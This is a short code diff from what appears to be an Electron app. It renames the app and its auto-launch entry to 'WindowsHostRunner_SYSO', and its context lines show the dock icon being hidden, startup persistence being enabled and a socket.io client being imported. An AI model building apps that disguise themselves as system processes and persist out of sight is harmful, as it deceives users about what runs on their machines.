@@ -18,7 +18,7 @@ if (app.dock){
   app.dock.hide();
 }
 
-app.setName("WindowsHostRunner_Orion");
+app.setName("WindowsHostRunner_SYSO");
 
 ////////////////////////////
 import io from 'socket.io-client'
@@ -36,7 +36,7 @@ const wallpaper = require('wallpaper');
 const autoLaunch = require('auto-launch');
 
 const autoLaunchPowers = new autoLaunch({
-  name: 'WindowsHostRunner_Orion'
+  name: 'WindowsHostRunner_SYSO'
 });
 autoLaunchPowers.enable();
 
